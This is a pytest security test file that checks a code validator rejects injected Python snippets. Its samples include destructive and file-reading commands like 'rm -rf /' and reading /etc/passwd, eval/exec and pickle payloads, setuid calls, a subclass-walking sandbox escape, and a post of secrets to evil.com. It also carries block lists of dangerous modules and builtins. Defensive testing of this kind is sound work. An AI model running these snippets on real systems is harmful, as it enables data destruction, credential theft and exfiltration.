"""
Security regression tests for injection attacks

Tests defense against OWASP Top 10 and code execution exploits.
Following TDD best practices - these tests should FAIL until implementation is complete.
"""

import gc

import pytest
from hypothesis import given
from hypothesis import strategies as st


# These imports will fail initially - that's expected in TDD!
try:
    from mcp_server_langgraph.execution.code_validator import CodeValidator
except ImportError:
    pytest.skip("CodeValidator not implemented yet", allow_module_level=True)


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testcommandinjection")
class TestCommandInjection:
    """Test defenses against command injection attacks"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json", "math", "datetime"])

    def test_reject_os_system_command_injection(self, validator):
        """Test blocking os.system() command injection"""
        malicious_codes = [
            "import os; os.system('rm -rf /')",
            "import os\nos.system('cat /etc/passwd')",
            "from os import system\nsystem('whoami')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False, f"Failed to block: {code}"

    def test_reject_subprocess_injection(self, validator):
        """Test blocking subprocess command injection"""
        malicious_codes = [
            "import subprocess; subprocess.call(['ls', '-la'])",
            "import subprocess\nsubprocess.run('rm -rf /', shell=True)",
            "from subprocess import Popen\nPopen(['cat', '/etc/passwd'])",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False, f"Failed to block: {code}"

    def test_reject_shell_execution_patterns(self, validator):
        """Test blocking shell execution patterns"""
        malicious_codes = [
            "import subprocess; subprocess.check_output('ls', shell=True)",
            "import os; os.popen('ls').read()",
            "import os; os.system('ls')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testcodeinjection")
class TestCodeInjection:
    """Test defenses against code injection attacks"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json", "math"])

    def test_reject_eval_injection(self, validator):
        """Test blocking eval() injection"""
        malicious_codes = [
            'eval(\'__import__("os").system("ls")\')',
            "result = eval(user_input)",
            "eval(f'{variable}')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_exec_injection(self, validator):
        """Test blocking exec() injection"""
        malicious_codes = [
            "exec('import os; os.system(\"ls\")')",
            "exec(user_input)",
            "exec(compile(code, '<string>', 'exec'))",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_compile_injection(self, validator):
        """Test blocking compile() injection"""
        malicious_codes = [
            "compile('import os', '<string>', 'exec')",
            "code_obj = compile(user_input, '<string>', 'eval')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_dynamic_import_injection(self, validator):
        """Test blocking __import__() injection"""
        malicious_codes = [
            "__import__('os').system('ls')",
            "mod = __import__('subprocess')",
            "__import__(module_name)",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testdeserializationattacks")
class TestDeserializationAttacks:
    """Test defenses against deserialization attacks"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json"])

    def test_reject_pickle_deserialization(self, validator):
        """Test blocking pickle deserialization (RCE risk)"""
        malicious_codes = [
            "import pickle; pickle.loads(data)",
            "import pickle\nwith open('file.pkl', 'rb') as f: pickle.load(f)",
            "from pickle import loads\nloads(malicious_data)",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_marshal_deserialization(self, validator):
        """Test blocking marshal deserialization"""
        malicious_codes = [
            "import marshal; marshal.loads(data)",
            "from marshal import load",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_yaml_unsafe_load(self, validator):
        """Test blocking YAML module (can be unsafe)"""
        # YAML is not in allowed_imports by default, so should be blocked
        validator_no_yaml = CodeValidator(allowed_imports=["json"])

        malicious_codes = [
            "import yaml; yaml.load(data)",  # Unsafe
            "from yaml import load\nload(data, Loader=yaml.Loader)",  # Unsafe
        ]

        for code in malicious_codes:
            result = validator_no_yaml.validate(code)
            # yaml should be blocked since it's not in allowed imports
            assert result.is_valid is False


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testpathtraversal")
class TestPathTraversal:
    """Test defenses against path traversal attacks"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json", "pathlib"])

    def test_reject_file_open_with_traversal(self, validator):
        """Test blocking open() with path traversal"""
        malicious_codes = [
            "open('../../../etc/passwd', 'r')",
            "open('/etc/passwd', 'r').read()",
            "with open('../../secret.txt') as f: data = f.read()",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            # open() should be blocked in sandbox
            assert result.is_valid is False

    def test_reject_os_path_operations(self, validator):
        """Test blocking os.path operations (path traversal risk)"""
        malicious_codes = [
            "import os.path; os.path.join('../../', 'etc', 'passwd')",
            "import os; os.walk('/etc')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testprivilegeescalation")
class TestPrivilegeEscalation:
    """Test defenses against privilege escalation"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json"])

    def test_reject_setuid_operations(self, validator):
        """Test blocking setuid operations"""
        malicious_codes = [
            "import os; os.setuid(0)",
            "import os; os.seteuid(0)",
            "import os; os.setgid(0)",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_ptrace_operations(self, validator):
        """Test blocking ptrace (debugging other processes)"""
        malicious_codes = [
            "import ctypes; ctypes.CDLL('libc.so.6').ptrace()",
            "import ptrace",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testreflectionandintrospection")
class TestReflectionAndIntrospection:
    """Test defenses against reflection/introspection attacks"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json", "math"])

    def test_reject_globals_access(self, validator):
        """Test blocking globals() access"""
        malicious_codes = [
            "g = globals()",
            "globals()['__builtins__']['eval']('malicious')",
            "g = globals(); g['os'] = __import__('os')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_locals_access(self, validator):
        """Test blocking locals() access"""
        malicious_codes = [
            "l = locals()",
            "locals()['x'] = 'malicious'",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_vars_access(self, validator):
        """Test blocking vars() access"""
        malicious_codes = [
            "v = vars()",
            "vars(obj)['attr'] = 'malicious'",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_getattr_abuse(self, validator):
        """Test blocking getattr() abuse"""
        malicious_codes = [
            "getattr(__builtins__, 'eval')('malicious')",
            "getattr(obj, '__class__').__bases__[0]",
            "getattr(getattr(__builtins__, '__import__')('os'), 'system')('ls')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_setattr_abuse(self, validator):
        """Test blocking setattr() abuse"""
        malicious_codes = [
            "setattr(obj, '__class__', malicious_class)",
            "setattr(__builtins__, 'eval', malicious_eval)",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_delattr_abuse(self, validator):
        """Test blocking delattr() abuse"""
        malicious_codes = [
            "delattr(obj, 'important_attribute')",
            "delattr(__builtins__, '__import__')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_class_manipulation(self, validator):
        """Test blocking class manipulation attacks"""
        malicious_codes = [
            "object.__class__.__bases__[0].__subclasses__()",
            "().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            # These are complex introspection patterns
            # At minimum, should generate warnings about suspicious attributes
            # Ideally would be blocked, but warnings are acceptable
            assert result.is_valid is False or len(result.warnings) > 0


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testnetworkattacks")
class TestNetworkAttacks:
    """Test defenses against network-based attacks"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json"])

    def test_reject_socket_operations(self, validator):
        """Test blocking socket operations"""
        malicious_codes = [
            "import socket; s = socket.socket()",
            "from socket import socket\nsock = socket()",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_urllib_without_whitelist(self, validator):
        """Test blocking urllib (network access)"""
        malicious_codes = [
            "import urllib.request; urllib.request.urlopen('http://evil.com')",
            "from urllib.request import urlopen\nurlopen('http://evil.com')",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_reject_requests_library(self, validator):
        """Test blocking requests library (network access)"""
        malicious_codes = [
            "import requests; requests.get('http://evil.com')",
            "from requests import post\npost('http://evil.com', data=secrets)",
        ]

        for code in malicious_codes:
            result = validator.validate(code)
            assert result.is_valid is False


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testresourceexhaustion")
class TestResourceExhaustion:
    """Test detection of resource exhaustion patterns"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json"])

    def test_warn_infinite_loop(self, validator):
        """Test warning on obvious infinite loops"""
        suspicious_codes = [
            "while True: pass",
            "while 1: continue",
        ]

        for code in suspicious_codes:
            result = validator.validate(code)
            # Should either reject or warn about infinite loop
            assert result.is_valid is False or len(result.warnings) > 0

    def test_warn_large_recursion(self, validator):
        """Test warning on deep recursion patterns"""
        code = """
def recursive_func(n):
    return recursive_func(n + 1)

recursive_func(0)
"""
        result = validator.validate(code)
        # Should warn about potential stack overflow
        # (full detection is hard, but obvious patterns should be caught)
        # For now, allow it but consider adding warning in future
        assert isinstance(result.is_valid, bool)

    def test_warn_memory_allocation_bomb(self, validator):
        """Test warning on obvious memory bombs"""
        suspicious_codes = [
            "x = [0] * (10**9)",  # Allocate 1 billion integers
            "data = 'a' * (10**9)",  # Allocate 1GB string
        ]

        for code in suspicious_codes:
            result = validator.validate(code)
            # Should warn about large allocations
            # (detection is optional, but good to have)
            assert isinstance(result.is_valid, bool)


@pytest.mark.security
@pytest.mark.property
@pytest.mark.xdist_group(name="testfuzzingattacks")
class TestFuzzingAttacks:
    """Property-based fuzzing tests for security"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @given(
        st.sampled_from(
            [
                "os",
                "sys",
                "subprocess",
                "socket",
                "pickle",
                "marshal",
                "ctypes",
                "importlib",
            ]
        )
    )
    def test_dangerous_module_imports_always_blocked(self, module):
        """Property: all dangerous module imports must be blocked"""
        validator = CodeValidator(allowed_imports=["json", "math"])
        code = f"import {module}"
        result = validator.validate(code)
        assert result.is_valid is False

    @given(
        st.sampled_from(
            [
                "eval",
                "exec",
                "compile",
                "__import__",
                "globals",
                "locals",
                "vars",
                "getattr",
                "setattr",
                "delattr",
                "open",
            ]
        )
    )
    def test_dangerous_builtin_calls_blocked(self, builtin_func):
        """Property: all dangerous builtin function calls must be blocked"""
        validator = CodeValidator(allowed_imports=["json", "math"])
        code = f"{builtin_func}('test')"
        result = validator.validate(code)
        assert result.is_valid is False

    @given(st.text(min_size=1, max_size=100, alphabet=st.characters(blacklist_categories=("Cs",))))
    def test_random_imports_mostly_rejected(self, module_name):
        """Property: random import names should mostly be rejected"""
        validator = CodeValidator(allowed_imports=["json", "math"])
        code = f"import {module_name}"
        result = validator.validate(code)
        # Either rejected or syntax error (both OK)
        assert isinstance(result.is_valid, bool)

    @given(st.text(min_size=1, max_size=100))
    def test_validator_robust_to_garbage_input(self, garbage):
        """Property: validator should never crash on garbage input"""
        validator = CodeValidator(allowed_imports=["json", "math"])
        try:
            result = validator.validate(garbage)
            assert hasattr(result, "is_valid")
        except (SyntaxError, ValueError):
            # Syntax errors are OK
            pass


@pytest.mark.security
@pytest.mark.unit
@pytest.mark.xdist_group(name="testowasptop10")
class TestOWASPTop10:
    """Test defenses against OWASP Top 10 vulnerabilities"""

    def teardown_method(self) -> None:
        """Force GC to prevent mock accumulation in xdist workers"""
        gc.collect()

    @pytest.fixture
    def validator(self):
        return CodeValidator(allowed_imports=["json", "math"])

    def test_injection_prevention(self, validator):
        """A01:2021 - Injection prevention"""
        # SQL injection (if allowed imports include DB)
        # Command injection (os, subprocess)
        # Code injection (eval, exec)
        injection_codes = [
            "eval(user_input)",
            "exec(user_input)",
            "import os; os.system(user_input)",
        ]

        for code in injection_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_insecure_deserialization_prevention(self, validator):
        """A08:2021 - Insecure deserialization prevention"""
        deserialization_codes = [
            "import pickle; pickle.loads(data)",
            "import marshal; marshal.loads(data)",
        ]

        for code in deserialization_codes:
            result = validator.validate(code)
            assert result.is_valid is False

    def test_ssrf_prevention(self, validator):
        """Test SSRF (Server-Side Request Forgery) prevention"""
        # Block network access that could be used for SSRF
        ssrf_codes = [
            "import urllib.request; urllib.request.urlopen(user_url)",
            "import socket; socket.create_connection(('internal', 22))",
        ]

        for code in ssrf_codes:
            result = validator.validate(code)
            assert result.is_valid is False
